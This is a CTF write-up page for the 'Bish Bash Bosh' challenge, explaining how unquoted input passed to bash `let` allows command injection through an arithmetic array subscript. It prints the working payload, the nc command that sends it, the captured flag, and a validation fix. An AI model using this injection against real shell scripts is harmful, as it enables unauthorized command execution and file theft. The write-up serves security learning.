@@ -1,0 +1,97 @@
+<!doctype html>
+<html lang="uz">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bish Bash Bosh — Platypwn 2026 | kholmirzaev.uz</title>
+<meta name="description" content="Platypwn 2026 CTF writeup: Bish Bash Bosh (Misc).">
+<link rel="canonical" href="https://kholmirzaev.uz/ctf/platypwn-2026/bish-bash-bosh.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bish Bash Bosh — Platypwn 2026">
+<meta property="og:description" content="Platypwn 2026 CTF writeup: Bish Bash Bosh (Misc).">
+<meta property="og:url" content="https://kholmirzaev.uz/ctf/platypwn-2026/bish-bash-bosh.html">
+<meta property="og:image" content="https://kholmirzaev.uz/assets/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="icon" href="/favicon.ico" sizes="any">
+<link rel="apple-touch-icon" href="/assets/icons/apple-touch-icon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Unbounded:wght@500;700;800&family=Manrope:wght@400;500;700&display=swap" rel="stylesheet">
+<script>try{var t=localStorage.getItem('theme');if(t==='dark'||t==='light')document.documentElement.dataset.theme=t}catch(e){}</script>
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/writeup.css">
+</head>
+<body>
+<nav><div class="wrap"><a href="/" class="logo" data-keep>kholmirzaev<span>.uz</span></a><div class="nav-right"><div class="lang" role="group" aria-label="Language"><button type="button" data-lang="uz">UZ</button><button type="button" data-lang="ru">RU</button><button type="button" data-lang="en">EN</button></div></div></div></nav>
+<main class="story">
+<div class="story-nav"><a href="./" data-keep>← <span data-k="all">Barcha writeup'lar</span></a><small>Platypwn 2026 · Misc</small></div>
+<div class="story-hero"><div class="eyebrow">Platypwn 2026 · Misc</div><h1>Bish Bash Bosh</h1><div data-l="uz"><p>Writeup ingliz tilida yozilgan.</p></div><div data-l="ru" hidden><p>Райтап написан на английском.</p></div><div data-l="en" hidden><p>The writeup is in English.</p></div></div>
+<article class="md" lang="en">
+<h1>Bish Bash Bosh (Misc)</h1>
+<h2>The challenge</h2>
+<blockquote>
+<p><em>Let</em> me just quickly bash something together so you can't get my <code>/flag/flag.txt</code>.</p>
+</blockquote>
+<p>A TCP service (socat) runs this script for every connection:</p>
+<pre><code class="language-bash">files=(
+  &quot;/flag/flag.txt&quot;
+  &quot;msg1&quot;
+  &quot;msg2&quot;
+  &quot;msg3&quot;
+)
+
+echo &quot;What message would you like to see? (0..2)&quot;
+read -r i
+let i=$i-1
+
+if (( i &lt; 1 || i &gt; 3 )); then
+  echo &quot;Nuh uh&quot;
+  exit 1
+fi
+
+file=&quot;${files[i]}&quot;
+cat -- &quot;$file&quot;
+</code></pre>
+<p>The flag is element 0 of the array, and the range check blocks index 0.</p>
+<h2>The bug</h2>
+<p>The italic <em>Let</em> in the description is the hint. <code>let</code> evaluates its argument as a <strong>bash arithmetic expression</strong>, and our input is placed into it unquoted.</p>
+<p>In bash arithmetic, an array subscript like <code>a[...]</code> is itself evaluated, and a command substitution <code>$(...)</code> inside the subscript is executed. So the input is not just a number: it can run a command before the range check ever happens.</p>
+<h2>Exploit</h2>
+<p>Payload:</p>
+<pre><code>a[$(cat${IFS}/flag/flag.txt&gt;&amp;0)]
+</code></pre>
+<ul>
+<li><code>${IFS}</code> replaces the space (spaces would split the argument).</li>
+<li><code>&gt;&amp;0</code> sends <code>cat</code>'s output to file descriptor 0. With socat <code>EXEC</code>, stdin is the network socket, so the output comes straight back to us.</li>
+<li>After that the script still prints <code>Nuh uh</code>, but the flag is already sent.</li>
+</ul>
+<pre><code class="language-bash">printf '%s\n' 'a[$(cat${IFS}/flag/flag.txt&gt;&amp;0)]' | nc -N HOST 9000
+</code></pre>
+<p>Output:</p>
+<pre><code>What message would you like to see? (0..2)
+PP{l3t_t00k_my_fl4g!!!::dtUQgusHeuoX}Nuh uh
+</code></pre>
+<p>I tested the payload locally on a copy of the script before sending it once to the target.</p>
+<h2>Flag</h2>
+<p><code>PP{l3t_t00k_my_fl4g!!!::dtUQgusHeuoX}</code></p>
+<h2>Takeaway</h2>
+<p>Never pass user input to <code>let</code>, <code>(( ))</code> or <code>$(( ))</code> in bash. Validate it first, for example with <code>[[ $i =~ ^[0-9]+$ ]]</code>, before any arithmetic.</p>
+</article>
+<div class="pager"><a href="hold-your-horses.html" data-keep>← <span data-k="prev">Oldingi</span>: Hold Your Horses</a><a href="diceware-warmup.html" data-keep><span data-k="next">Keyingi</span>: Diceware (warmup) →</a></div>
+</main>
+<footer><div class="wrap"><span>© <span id="year"></span> Valililloh Kholmirzaev</span><a href="/" data-keep>kholmirzaev.uz</a></div></footer>
+<script>
+(()=>{const L={"uz": {"home": "Bosh sahifa", "all": "Barcha writeup'lar", "prev": "Oldingi", "next": "Keyingi"}, "ru": {"home": "На главную", "all": "Все райтапы", "prev": "Назад", "next": "Далее"}, "en": {"home": "Home", "all": "All writeups", "prev": "Previous", "next": "Next"}},langs=['uz','ru','en'];let l=new URLSearchParams(location.search).get('lang');
+if(!langs.includes(l)){try{l=localStorage.getItem('lang')}catch(e){}}
+if(!langs.includes(l)){l=(navigator.language||'').slice(0,2);if(!langs.includes(l))l='uz'}
+const apply=(x,save)=>{document.documentElement.lang=x;
+document.querySelectorAll('[data-l]').forEach(e=>e.hidden=e.dataset.l!==x);
+document.querySelectorAll('[data-k]').forEach(e=>e.textContent=L[x][e.dataset.k]);
+document.querySelectorAll('[data-lang]').forEach(e=>e.setAttribute('aria-pressed',String(e.dataset.lang===x)));
+document.querySelectorAll('a[data-keep]').forEach(e=>{const u=new URL(e.getAttribute('href'),location.href);u.searchParams.set('lang',x);e.href=u.pathname+u.search+u.hash});
+if(save){try{localStorage.setItem('lang',x)}catch(e){}}};
+document.querySelectorAll('[data-lang]').forEach(b=>b.addEventListener('click',()=>apply(b.dataset.lang,true)));
+apply(l,false);const y=document.getElementById('year');if(y)y.textContent=new Date().getFullYear()})();
+</script>
+</body>
+</html>
